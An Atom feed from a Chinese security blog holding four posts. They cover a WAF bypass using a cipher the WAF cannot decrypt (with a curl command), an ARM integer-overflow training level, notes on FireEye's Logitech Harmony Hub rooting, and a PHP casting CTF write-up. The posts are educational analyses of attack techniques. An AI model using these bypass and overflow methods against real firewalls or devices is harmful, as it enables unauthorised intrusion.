<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xd_xd&#39;s blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://xdxd.love/"/>
  <updated>2018-09-10T02:48:59.718Z</updated>
  <id>http://xdxd.love/</id>
  
  <author>
    <name>xd_xd</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>利用SSL问题绕过WAF文章分析</title>
    <link href="http://xdxd.love/2018/09/10/%E5%88%A9%E7%94%A8SSL%E9%97%AE%E9%A2%98%E7%BB%95%E8%BF%87WAF%E6%96%87%E7%AB%A0%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2018/09/10/利用SSL问题绕过WAF文章分析/</id>
    <published>2018-09-10T02:39:39.000Z</published>
    <updated>2018-09-10T02:48:59.718Z</updated>
    
    <content type="html"><![CDATA[<h4 id="利用SSL密钥支持不对称绕过WAF">利用SSL密钥支持不对称绕过WAF</h4><p>orange大神在讲到前后矛盾导致的安全问题时提到了利用SSL密钥支持情况的前后矛盾导致WAF绕过的文章。</p>
<blockquote>
<p>There is also another very cool article Bypassing Web-Application Firewalls by abusing SSL/TLS to illustrate how “inconsistency” be awesome by @0x09AL</p>
</blockquote>
<p>文中的大致思路是WAF TLS 支持的算法和WEB server支持的算法不完全一致。所以可以选择一个web server支持，但是WAF不支持的算法。这样子WAF由于不支持这个算法而无法分析TLS流量，导致WAF失效。</p>
<p>文中给出的架构图如下：</p>
<p><img src="/images/Screen Shot 2018-09-05 at 11.40.09 AM.png" alt="Alt text"></p>
<p>WAF支持的算法如下：</p>
<p><img src="/images/Screen Shot 2018-09-05 at 11.41.08 AM.png" alt="Alt text"></p>
<p>所以选用一个WAF不支持但是服务器支持的算法，选用TLSv1 256 bits ECDHE-RSA-AES256-SHA。就可以是WAF无法识别导致绕过。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn@thinkpad:~$ curl --ciphers ECDHE-RSA-AES256-SHA https://waf-test.lab.local/ssl-cipher-test&#10;&#60;html lang=en&#62;&#10;  &#60;title&#62;HELLO &#60;/title&#62;&#10;  &#60;p&#62;Bypass worked&#60;/p&#62;&#10;pwn@thinkpad:~$</span><br></pre></td></tr></table></figure>
<h4 id="利用条件和WAF的部署方式">利用条件和WAF的部署方式</h4><p>这个思路初看十分惊奇,而且绕过是彻底完全的绕过。如果在realworld里这种类型的利用会威力比较大。但是仔细一想，想考虑一下具体绕过的原理就会觉得好像有些问题。文章图中，WAF作为中间人的位置，看起来会理解成反向代理的部署模式。如果WAF不支持这个算法，那么在TLS协商算法的时候应该会失败才对，怎么实现正常的通信呢。</p>
<p><a href="https://www.reddit.com/r/netsec/comments/8vq2dx/bypassing_webapplication_firewalls_by_abusing/" target="_blank" rel="external">reddit</a>下面的评论指出了文章中有些不清楚的地方。</p>
<p><img src="/images/Screen Shot 2018-09-10 at 10.20.38 AM.png" alt="Alt text"></p>
<p>这里提到的bypass是指WAF在旁路部署的时候，由于TLS的原理，WAF只能解密部分算法的加密数据。所以WAF旁路部署并不是好的实践，考虑到文中作者提到是在测试这个WAF，所以可能是测试阶段才选择了旁路部署。</p>
<p>原文中没有明确说明WAF的部署方式，是一个小缺陷。考虑到部署方式的这个利用条件，这个bypass的方式在真实世界的利用效果就会大打折扣了。</p>
<h4 id="TLS流量的解密">TLS流量的解密</h4><p>要理解为什么旁路部署的WAF不直接解密某些算法，需要详细分析TLS协议和部分算法的原理。具体可以参考后文的资料。</p>
<p>简单点介绍就是当TLS选用了RSA算法的时候，由于密钥是用服务器公钥加密传输的，所有只要有了服务器的私钥，就可以获得对称加密的密钥从而可以解密流量。这个可以在0x09AL的文中看到WAF支持的算法都是用RSA交换密钥。WAF即使配置了私钥，也只能解密这些算法的流量。</p>
<p><img src="/images/Screen Shot 2018-09-10 at 10.30.02 AM.png" alt="Alt text"></p>
<p>而后来0x09AL用来绕过的算法是ECDHE-RSA-AES256-SHA。ECDH算法用来交换密钥的话，仅仅旁路是无法获得真正的加密密钥的，所以也就无法解密流量。而在TLS1.2中，都已经是优先选择ECDH算法。所以旁路部署的WAF其实是不适合https的场景的。</p>
<h4 id="思考">思考</h4><h4 id="参考资料">参考资料</h4><h5 id="图解密码学技术_读书笔记">图解密码学技术 读书笔记</h5><p>SSL/TLS的目标</p>
<p>保证数据传输过程的保密性，传输过程的完成性，以及不可否认性。</p>
<p>要确保机密性，可以使用对称密码。由于对称密钥不能被攻击者预测，因此我们使用伪随机数生成器来生成密钥。若要将对称密码的密钥发送给通信对象，可以使用公钥密码或者Diffie-Hellman密钥交换。</p>
<p>要识别篡改，对数据进行认证，可以使用消息认证码。消息认证码是使用单向散列函数来实现的。</p>
<p>要对通信对象进行认证，可以使用对公钥加上数字签名所生成的证书。</p>
<p>下面只需要用一个框架把上面这些工具组合起来就可以了。SSL/TLS其实就扮演了这样一种框架的角色。</p>
<p>TLS握手协议包括：握手协议、密码规格变更协议、警告协议和应用数据协议。</p>
<p><a href="http://www.freebuf.com/articles/network/116497.html" target="_blank" rel="external">传输层安全协议抓包分析之SSL/TLS</a><br><a href="http://www.freebuf.com/articles/web/135545.html" target="_blank" rel="external">TLS1.3</a><br><a href="https://www.anquanke.com/post/id/150718" target="_blank" rel="external">如何通过滥用SSL/TLS绕过Web应用防火墙(WAF)</a><br><a href="https://www.reddit.com/r/netsec/comments/8vq2dx/bypassing_webapplication_firewalls_by_abusing/" target="_blank" rel="external">Bypassing Web-Application Firewalls by abusing SSL/TLS</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;利用SSL密钥支持不对称绕过WAF&quot;&gt;利用SSL密钥支持不对称绕过WAF&lt;/h4&gt;&lt;p&gt;orange大神在讲到前后矛盾导致的安全问题时提到了利用SSL密钥支持情况的前后矛盾导致WAF绕过的文章。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;There is also 
    
    </summary>
    
      <category term="加密解密" scheme="http://xdxd.love/categories/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/"/>
    
    
  </entry>
  
  <entry>
    <title>exploit_me 基于ARM架构的二进制漏洞教程之整数溢出</title>
    <link href="http://xdxd.love/2018/05/09/exploit-me-%E5%9F%BA%E4%BA%8EARM%E6%9E%B6%E6%9E%84%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E6%95%99%E7%A8%8B%E4%B9%8B%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/"/>
    <id>http://xdxd.love/2018/05/09/exploit-me-基于ARM架构的二进制漏洞教程之整数溢出/</id>
    <published>2018-05-09T01:56:32.000Z</published>
    <updated>2018-05-09T01:57:33.245Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/bkerler/exploit_me" target="_blank" rel="external">https://github.com/bkerler/exploit_me</a> 是github上一个学习ARM架构下二进制漏洞的项目。目前包括13个不同类型的漏洞，包括</p>
<p>Level 1: Integer overflow</p>
<p>Level 2: Stack overflow</p>
<p>Level 3: Array overflow</p>
<p>Level 4: Off by one</p>
<p>Level 5: Stack cookie</p>
<p>Level 6: Format string</p>
<p>Level 7: Heap overflow</p>
<p>Level 8: Structure redirection / Type confusion</p>
<p>Level 9: Zero pointers</p>
<p>Level 10: Command injection</p>
<p>Level 11: Path Traversal</p>
<p>Level 12: Basic ROP</p>
<p>Level 13: Use-after-free</p>
<p>本系列文章会一一介绍每个漏洞的详细原理和常见的利用方式和联系真实世界的物联网设备漏洞做分析。</p>
<h2 id="测试环境">测试环境</h2><p>exploit_me提供了一个vagrant环境用作测试，不过下载vagrant速度非常慢，建议自己编译源码，在自己的arm环境中调试。也可以直接下载我编译好的可执行文件。<a href="https://github.com/stayliv3/blog_material/blob/master/exploit4" target="_blank" rel="external">https://github.com/stayliv3/blog_material/blob/master/exploit4</a></p>
<h2 id="ida反汇编">ida反汇编</h2><p>第一关的密码试hello。先尝试运行。</p>
<p><img src="http://image.3001.net/images/20180508/15257632679296.png!small" alt="armint1.png"></p>
<p>降低难度，可以先看一下源码：</p>
<p>/<em> LEVEL 1 </em>/</p>
<p>int int_overflow(char* value)</p>
<p>{</p>
<pre><code><span class="keyword">unsigned</span> <span class="keyword">short</span> number;

<span class="keyword">int</span> i = atoi(value);

    <span class="keyword">unsigned</span> <span class="keyword">int</span> h=i;

<span class="keyword">if</span> (h&lt;=<span class="number">0</span>)

{

    <span class="built_in">printf</span>(<span class="string">"Value less or equal 0 is not allowed.\n"</span>);

    <span class="built_in">exit</span>(<span class="number">0</span>);

}

number=i;

<span class="keyword">if</span> (number!=<span class="number">0</span>)

{

    <span class="built_in">printf</span>(<span class="string">"Value %d defined.\n"</span>,number);

    <span class="built_in">exit</span>(<span class="number">0</span>);

}

<span class="keyword">if</span> (i&lt;<span class="number">0</span> || number==<span class="number">0</span>) <span class="comment">// Two ways of overflow possible ... int AND short :)</span>

{

    <span class="built_in">printf</span>(<span class="string">"Level 2 Password: \"%s\"\n"</span>,passwds[<span class="number">1</span>]);

}
</code></pre><p>return 0;</p>
<p>}</p>
<p>unsigned short number;</p>
<pre><code><span class="keyword">int</span> i = atoi(value);

    <span class="keyword">unsigned</span> <span class="keyword">int</span> h=i;

<span class="keyword">if</span> (h&lt;=<span class="number">0</span>)

{

    <span class="built_in">printf</span>(<span class="string">"Value less or equal 0 is not allowed.\n"</span>);

    <span class="built_in">exit</span>(<span class="number">0</span>);

} 
</code></pre><p>将输入字符串使用atoi转换成int类型，然后转换成无符号int，如果结果小于0则退出，这里显然输入一个正数就可以不退出。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (number!=0)&#10;&#10;&#160;&#160;&#160; &#123;&#10;&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160; printf(&#34;Value %d defined.\n&#34;,number);&#10;&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160; exit(0);&#10;&#10;&#160;&#160;&#160; &#125;&#10;&#10;&#160;&#160;&#160; if (i&#60;0 || number==0) // Two ways of overflow possible ... int AND short :)&#10;&#10;&#160;&#160;&#160; &#123;&#10;&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160; printf(&#34;Level 2 Password: \&#34;%s\&#34;\n&#34;,passwds[1]);&#10;&#10;&#160;&#160;&#160; &#125;</span><br></pre></td></tr></table></figure>
<p>number是short型，将int赋值给short会造成整数的截断问题。然后判断number是否等于0，如果不等于0则退出，如果小于0或者等于0 则打印出下一关的password。显然，我们的输入需要满足这个条件，进入这个分支逻辑。</p>
<p>根据程序输入，在ida中定位相关的函数：<img src="http://image.3001.net/images/20180508/15257634881105.png!small" alt="armint2.png"></p>
<h2 id="gdb调试">gdb调试</h2><p>设置断点和程序运行的参数：</p>
<p>gef&gt; b int_overflowBreakpoint 1 at 0x11164</p>
<p>gef&gt; set args hello 2222</p>
<p>第一个可能出现问题的语句是</p>
<p>int i = atoi(value); </p>
<p> unsigned int h=i;</p>
<p>有符号数转换成无符号数，由于有符号数和无符号数的表示范围不一致，在转换过程中容易出现问题。查看对应的汇编代码：当输入 -1时：</p>
<p><img src="http://image.3001.net/images/20180508/15257635873493.png!small" alt="armint3.png"></p>
<p>可以看到对应的汇编代码为：</p>
<p>str r0,[r11,#-8]</p>
<p>ldr r3,[r11,#-8]</p>
<p>str r3,[r11,#-12]</p>
<p>ldr r3,[r11,#-12]</p>
<p>进行了2次内存的读写，但是依然是r0的值没有变化，其实在汇编语言层面是没有有符号数和无符号数的区别的。是否有符号是更上一层的语言的解释效果。可以参考附录中关于符号数，补码的原理。对底层来说只有二进制加法而已。所以有符号数和无符号数的转换，本身变量的二进制是不变的，变的只是上一层语言对其的解释。</p>
<p>第二个容易出现问题的点： number=i;将整型赋值给short int。会造成截断。</p>
<p><img src="http://image.3001.net/images/20180508/15257636375401.png!small" alt="armint4.png"></p>
<p>对应的汇编代码为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x111a4 &#60;int_overflow(char*)+64&#62; ldr    r3,  [r11,  #-8]&#10;0x111a8 &#60;int_overflow(char*)+68&#62; strh   r3,  [r11,  #-14]&#10;0x111ac &#60;int_overflow(char*)+72&#62; ldrh   r3,  [r11,  #-14]</span><br></pre></td></tr></table></figure>
<p>strh 加了h标记表示half word。取低位的2个字节。</p>
<p>所以保证低位2个字节是全零就可以绕过这个判断。</p>
<p>比如0x10000,10进制是65536，利用整数的阶段问题。也可以使用负数-2147483648，利用了有符号数转无符号数的问题。</p>
<p><img src="http://image.3001.net/images/20180508/15257636751284.png!small" alt="armint6.png"><br><img src="/images/armint7.png" alt="armint6.png"></p>
<h2 id="参考资料">参考资料</h2><p><a href="http://phrack.org/issues/60/10.html#article" target="_blank" rel="external">http://phrack.org/issues/60/10.html#article</a></p>
<p><a href="http://roo0.me/2017/11/06/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" target="_blank" rel="external">http://roo0.me/2017/11/06/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/</a></p>
<p><a href="https://www.zhihu.com/question/20159860" target="_blank" rel="external">https://www.zhihu.com/question/20159860</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://github.com/bkerler/exploit_me&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/bkerler/exploit_me&lt;/a&gt; 是github上一个学习ARM架
    
    </summary>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
    
  </entry>
  
  <entry>
    <title>Fireeye关于Logitech Harmony Hub设备安全的读blog笔记</title>
    <link href="http://xdxd.love/2018/05/08/Fireeye%E5%85%B3%E4%BA%8ELogitech-Harmony-Hub%E8%AE%BE%E5%A4%87%E5%AE%89%E5%85%A8%E7%9A%84%E8%AF%BBblog%E7%AC%94%E8%AE%B0/"/>
    <id>http://xdxd.love/2018/05/08/Fireeye关于Logitech-Harmony-Hub设备安全的读blog笔记/</id>
    <published>2018-05-08T08:49:25.000Z</published>
    <updated>2018-05-08T08:58:07.837Z</updated>
    
    <content type="html"><![CDATA[<p>Fireeye发了一篇文章，标题叫Rooting a Logitech Harmony Hub: Improving Security in Today’s IoT World。root了Logitech Harmony Hub，为今天的物联网世界安全做贡献。也是充满了情怀。</p>
<p>发现了一下4个漏洞：</p>
<p>1，不恰当的证书验证<br>2，不安全的升级过程<br>3，固件中存在调试用的符号<br>4，空的root用户密码</p>
<p>看起来都是逻辑设计上的问题，不是技术宅关心的内存破坏类的漏洞。</p>
<h2 id="分析过程">分析过程</h2><p>通过串口获取到一些信息</p>
<p><img src="/images/fireeyehub1.png" alt=""></p>
<p>手机和设备之间通过http通信，通过做中间人获取到升级包的地址。拿到升级包。</p>
<p><img src="/images/fireeyehub2.png" alt=""></p>
<p>分析升级包：<br>使用unsqashfs_all.sh解压升级包。目测用binwalk应该可以。</p>
<p><img src="/images/fireeyehub3.png" alt=""></p>
<p>文件没有strip<br><img src="/images/fireeyehub4.png" alt=""></p>
<p>etc/passwd中root密码为空<br><img src="/images/fireeyehub5.png" alt=""></p>
<p>但是ssh默认没有启动。</p>
<p>通过替换升级包，执行命令，启动ssh。获取root权限</p>
<p><img src="/images/fireeyehub6fir.png" alt=""></p>
<h2 id="总结">总结</h2><p>简单点说应该是利用中间人攻击，替换升级包获得命令执行权限。一直觉得中间人攻击是一种偏理论的攻击方式。现在大家都用https了。http也被认为是不安全的了。可见防中间人攻击的能力应该作为一种基础的防御能力了。</p>
<h2 id="参考资料">参考资料</h2><p><a href="https://www.fireeye.com/blog/threat-research/2018/05/rooting-logitech-harmony-hub-improving-iot-security.html" target="_blank" rel="external">https://www.fireeye.com/blog/threat-research/2018/05/rooting-logitech-harmony-hub-improving-iot-security.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Fireeye发了一篇文章，标题叫Rooting a Logitech Harmony Hub: Improving Security in Today’s IoT World。root了Logitech Harmony Hub，为今天的物联网世界安全做贡献。也是充满了情怀
    
    </summary>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
    
  </entry>
  
  <entry>
    <title>一个CTF GAME引发的php内核分析</title>
    <link href="http://xdxd.love/2018/04/12/%E4%B8%80%E6%AC%A1php%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E7%9A%84%E7%BB%8F%E5%8E%86/"/>
    <id>http://xdxd.love/2018/04/12/一次php内核源码分析的经历/</id>
    <published>2018-04-12T02:16:08.000Z</published>
    <updated>2018-04-12T02:32:20.479Z</updated>
    
    <content type="html"><![CDATA[<h2 id="solveme-peng-kr_winter_sleep">solveme.peng.kr winter  sleep</h2><p>solveme是一个CTF的练习平台，其中winter sleep题目是这样的。</p>
<pre><code><span class="php"><span class="preprocessor">&lt;?php</span>
   error_reporting(<span class="number">0</span>);
   <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;
   <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'time'</span>])){
       <span class="keyword">if</span>(!is_numeric(<span class="variable">$_GET</span>[<span class="string">'time'</span>])){
           <span class="keyword">echo</span> <span class="string">'The time must be number.'</span>;
       }<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">'time'</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>){
           <span class="keyword">echo</span> <span class="string">'This time is too short.'</span>;
       }<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">'time'</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>){
           <span class="keyword">echo</span> <span class="string">'This time is too long.'</span>;
       }<span class="keyword">else</span>{
           sleep((int)<span class="variable">$_GET</span>[<span class="string">'time'</span>]);
           <span class="keyword">echo</span> <span class="variable">$flag</span>;
       }
       <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;
   }
   highlight_file(<span class="keyword">__FILE__</span>);</span>
</code></pre><p>输入一个字符串，通过is_numric的判断，要大于5184000小于777600，最后通过sleep函数，就可以输出flag。显然，如果输入一个较大的数，会sleep很长时间。需要一个数大于5184000，然后int之后又要是一个很小的数。</p>
<p>解决的方案是这样的：</p>
<pre><code><span class="php"><span class="preprocessor">&lt;?php</span>
<span class="keyword">echo</span> <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>;
<span class="keyword">echo</span> <span class="string">"\n"</span>;
<span class="keyword">echo</span> <span class="number">6e6</span>;
<span class="keyword">echo</span> <span class="string">"\n"</span>;
<span class="keyword">echo</span> (int)<span class="string">'6e6'</span>;
<span class="keyword">echo</span> <span class="string">"\n"</span>;
<span class="keyword">echo</span> <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>;</span>
</code></pre><p>可以看以上脚本输出内容:</p>
<pre><code><span class="number">5184000</span>
<span class="number">6000000</span>
<span class="number">6</span>
<span class="number">7776000</span>
</code></pre><p>使用科学计数法。</p>
<p>看了一些writeup，只是给出了解决的办法，但是并没有详细的说明，为什么会这样。有的地方提到说是弱类型，虽然这几次比较存在类型的自动转换，但是跟我理解的弱类型的自动转换存在差异。所以想要探究一番。</p>
<h2 id="黑盒测试">黑盒测试</h2><p><img src="/images/phpcore1.png" alt=""><br>可以看到当接收到科学计数法表示的字符串跟一个整型变量运算(‘6e6’-0)，6e6自动并不是自动转换成了int型，而是转换成了float，所以最终的数字是float型的6000000。最后两行代码可以直接的说明了问题。使用int强制转换一个科学计数法表示的字符串，转换过程中并不能识别科学计数法，只是把e当做普通字符了。效果跟6a6是一样的。而用float转成浮点数，则可以成功识别科学计数法。</p>
<p><img src="/images/phpcore2.png" alt=""></p>
<h2 id="feature_or_bug">feature or bug</h2><p>我的感觉是这应该是php的一个bug。同一个字符串，转换成int型和float型有着两种解释。正常的逻辑应该是(int)’6e6’ = (int)(float)’6e6’。这样才比较符合正常的一个理解逻辑。</p>
<p>找了几个php的版本，分别做了下测试：</p>
<p>测试脚本如下：</p>
<pre><code>import docker
client = docker.<span class="function"><span class="title">from_env</span><span class="params">()</span></span>


php_versions = [<span class="string">'5.3'</span>,<span class="string">'5.4'</span>,<span class="string">'5.5'</span>,<span class="string">'5.6'</span>, <span class="string">'7.0'</span>,<span class="string">'7.1'</span>,<span class="string">'7.2'</span>]
<span class="keyword">for</span> version <span class="function"><span class="title">in</span><span class="params">(php_versions)</span></span>:
php = <span class="string">"php:"</span>+version + <span class="string">"-cli"</span>

<span class="function"><span class="title">print</span><span class="params">(php)</span></span>
<span class="function"><span class="title">print</span><span class="params">(<span class="string">"echo((int)'6e6')"</span>)</span></span>
<span class="function"><span class="title">print</span><span class="params">(client.containers.run(<span class="string">"php:"</span>+version+<span class="string">"-cli"</span>, <span class="string">''</span><span class="string">'php -r "echo((int)'</span><span class="number">6</span>e6<span class="string">');"'</span><span class="string">''</span>)</span></span>)
<span class="function"><span class="title">print</span><span class="params">(<span class="string">"echo((float)'6e6')"</span>)</span></span>
<span class="function"><span class="title">print</span><span class="params">(client.containers.run(<span class="string">"php:"</span>+version+<span class="string">"-cli"</span>, <span class="string">''</span><span class="string">'php -r "echo((float)'</span><span class="number">6</span>e6<span class="string">');"'</span><span class="string">'’))</span></span></span>
</code></pre><p>结果如下：</p>
<pre><code>➜  dockerpy python phptest<span class="class">.py</span>
php:<span class="number">5.3</span>-cli
<span class="function"><span class="title">echo</span><span class="params">((int)</span></span><span class="string">'6e6'</span>)
<span class="number">6</span>
<span class="function"><span class="title">echo</span><span class="params">((float)</span></span><span class="string">'6e6'</span>)
<span class="number">6000000</span>
php:<span class="number">5.4</span>-cli
<span class="function"><span class="title">echo</span><span class="params">((int)</span></span><span class="string">'6e6'</span>)
<span class="number">6</span>
<span class="function"><span class="title">echo</span><span class="params">((float)</span></span><span class="string">'6e6'</span>)
<span class="number">6000000</span>
php:<span class="number">5.5</span>-cli
<span class="function"><span class="title">echo</span><span class="params">((int)</span></span><span class="string">'6e6'</span>)
<span class="number">6</span>
<span class="function"><span class="title">echo</span><span class="params">((float)</span></span><span class="string">'6e6'</span>)
<span class="number">6000000</span>
php:<span class="number">5.6</span>-cli
<span class="function"><span class="title">echo</span><span class="params">((int)</span></span><span class="string">'6e6'</span>)
<span class="number">6</span>
<span class="function"><span class="title">echo</span><span class="params">((float)</span></span><span class="string">'6e6'</span>)
<span class="number">6000000</span>
php:<span class="number">7.0</span>-cli
<span class="function"><span class="title">echo</span><span class="params">((int)</span></span><span class="string">'6e6'</span>)
<span class="number">6</span>
<span class="function"><span class="title">echo</span><span class="params">((float)</span></span><span class="string">'6e6'</span>)
<span class="number">6000000</span>
php:<span class="number">7.1</span>-cli
<span class="function"><span class="title">echo</span><span class="params">((int)</span></span><span class="string">'6e6'</span>)
<span class="number">6000000</span>
<span class="function"><span class="title">echo</span><span class="params">((float)</span></span><span class="string">'6e6'</span>)
<span class="number">6000000</span>
php:<span class="number">7.2</span>-cli
<span class="function"><span class="title">echo</span><span class="params">((int)</span></span><span class="string">'6e6'</span>)
<span class="number">6000000</span>
<span class="function"><span class="title">echo</span><span class="params">((float)</span></span><span class="string">'6e6'</span>)
<span class="number">6000000</span>
</code></pre><p>在php7.0以前的版本中(int)’6e6’结果是6，但是在7.1以后的版本中，(int)’6e6’已经是6000000，符合(int)’6e6’ = (int)(float)’6e6’这个逻辑了。</p>
<h2 id="php内核分析">php内核分析</h2><p>以下内容引用自《php7内核剖析》：</p>
<p>PHP是弱类型语言，不需要明确的定义变量的类型，变量的类型根据使用时的上下文所决定，也就是变量会根据不同表达式所需要的类型自动转换，比如求和，PHP会将两个相加的值转为long、double再进行加和。每种类型转为另外一种类型都有固定的规则，当某个操作发现类型不符时就会按照这个规则进行转换，这个规则正是弱类型实现的基础。<br>除了自动类型转换，PHP还提供了一种强制的转换方式:</p>
<ul>
<li>(int)/(integer)：转换为整形 integer</li>
<li>(bool)/(boolean)：转换为布尔类型 boolean</li>
<li>(float)/(double)/(real)：转换为浮点型 float</li>
<li>(string)：转换为字符串 string</li>
<li>(array)：转换为数组 array</li>
<li>(object)：转换为对象 object</li>
<li>(unset)：转换为 NULL<br>无论是自动类型转换还是强制类型转换，不是每种类型都可以转为任意其他类型。</li>
</ul>
<p>4.1.3 转换为整型</p>
<p>其它类型转为整形的转换规则：</p>
<ul>
<li>NULL：转为0</li>
<li>布尔型：false转为0，true转为1</li>
<li>浮点型：向下取整，比如：(int)2.8 =&gt; 2</li>
<li>字符串：就是C语言strtoll()的规则，如果字符串以合法的数值开始，则使用该数值，否则其值为 0（零），合法数值由可选的正负号，后面跟着一个或多个数字（可能有小数点），再跟着可选的指数部分</li>
<li>数组：很多操作不支持将一个数组自动整形处理，比如：array() + 2，将报error错误，但可以强制把数组转为整形，非空数组转为1，空数组转为0，没有其他值</li>
<li>对象：与数组类似，很多操作也不支持将对象自动转为整形，但有些操作只会抛一个warning警告，还是会把对象转为1操作的，这个需要看不同操作的处理情况</li>
<li><p>资源：转为分配给这个资源的唯一编号<br>具体处理：</p>
<p>  ZEND_API zend_long ZEND_FASTCALL _zval_get_long_func(zval *op)<br>  {<br>  try_again:</p>
<pre><code><span class="keyword">switch</span> (Z_TYPE_P(op)) {
    <span class="keyword">case</span> <span class="string">IS_NULL:</span>
    <span class="keyword">case</span> <span class="string">IS_FALSE:</span>
        <span class="keyword">return</span> <span class="number">0</span>;
    <span class="keyword">case</span> <span class="string">IS_TRUE:</span>
        <span class="keyword">return</span> <span class="number">1</span>;
    <span class="keyword">case</span> <span class="string">IS_RESOURCE:</span>
        <span class="comment">//资源将转为zend_resource-&gt;handler</span>
        <span class="keyword">return</span> Z_RES_HANDLE_P(op);
    <span class="keyword">case</span> <span class="string">IS_LONG:</span>
        <span class="keyword">return</span> Z_LVAL_P(op);
    <span class="keyword">case</span> <span class="string">IS_DOUBLE:</span>
        <span class="keyword">return</span> zend_dval_to_lval(Z_DVAL_P(op));
    <span class="keyword">case</span> <span class="string">IS_STRING:</span>
        <span class="comment">//字符串的转换调用C语言的strtoll()处理</span>
        <span class="keyword">return</span> ZEND_STRTOL(Z_STRVAL_P(op), NULL, <span class="number">10</span>);
    <span class="keyword">case</span> <span class="string">IS_ARRAY:</span>
        <span class="comment">//根据数组是否为空转为0,1</span>
        <span class="keyword">return</span> zend_hash_num_elements(Z_ARRVAL_P(op)) ? 1 : <span class="number">0</span>;
    <span class="keyword">case</span> <span class="string">IS_OBJECT:</span>
        {  
            zval dst;
            convert_object_to_type(op, &amp;dst, IS_LONG, convert_to_long);
            <span class="keyword">if</span> (Z_TYPE(dst) == IS_LONG) {
                <span class="keyword">return</span> Z_LVAL(dst);
            } <span class="keyword">else</span> {
                <span class="comment">//默认情况就是1</span>
                <span class="keyword">return</span> <span class="number">1</span>;
            }
        }
    <span class="keyword">case</span> <span class="string">IS_REFERENCE:</span>
        op = Z_REFVAL_P(op);
        goto try_again;
        EMPTY_SWITCH_DEFAULT_CASE()
}
<span class="keyword">return</span> <span class="number">0</span>;
</code></pre><p>  }</p>
</li>
</ul>
<p>4.1.4 转换为浮点型</p>
<p>除字符串类型外，其它类型转换规则与整形基本一致，就是整形转换结果加了一位小数，字符串转为浮点数由zend_strtod()完成，这个函数非常长，定义在zend_strtod.c中，这里不作说明。</p>
<p>书中提到，字符串转换为整型，是C语言strtol()的规则，由ZEND_STRTOL函数完成的，字符串转换成浮点数，是用zend_strtod函数完成的。</p>
<p>对比一下C语言的strtol和strtod</p>
<p><img src="/images/phpcore3.png" alt=""></p>
<p><img src="/images/phpcore4.png" alt=""></p>
<p>strtol不能识别科学计数法，字符串6e6转成整型是6，而strtod可以识别科学计数法，6e6转成浮点数是6000000。</p>
<h2 id="动态调试php内核">动态调试php内核</h2><h1 id="编译debug版php。">编译debug版php。</h1><pre><code>git clone http://git.php.net/repository/php-src.git
cd php-src
git checkout PHP-<span class="number">7.0</span>
./buildconf
./configure --disable-all --enable-debug --prefix=<span class="variable">$HOME</span>/myphp
make
make install
</code></pre><h1 id="gdb调试">gdb调试</h1><pre><code>gdb --<span class="keyword">args</span> php -<span class="keyword">r</span> "<span class="keyword">echo</span>((<span class="keyword">int</span>)<span class="string">'6e6'</span>);”
</code></pre><p>在类型转换函数上下断点：</p>
<pre><code><span class="tag">b</span> _zval_get_long_func
</code></pre><p><img src="/images/phpcore5.png" alt=""></p>
<p>可以看到使用zend_strtol函数进行转换。</p>
<p><img src="/images/phpcore6.png" alt=""></p>
<p>zent_strtol 直接是使用strtoll。</p>
<p>调试一下7.1版本php</p>
<p><img src="/images/phpcore7.png" alt=""></p>
<p>可以看到7.1版中使用了新的函数is_numeric_string替代strtoll。注释中说明使用新函数是为了避免strtoll的溢出问题，自己实现了is_number_string函数来替代strtoll。然而并没有提到科学计数法表示的字符串的问题。但是实际实现上跟strtoll有不同。妥善的处理科学计数法表示的数字。</p>
<p><img src="/images/phpcore8.png" alt=""></p>
<p>最终的字符串转整型的逻辑如下：</p>
<p><img src="/images/phpcore9.png" alt=""></p>
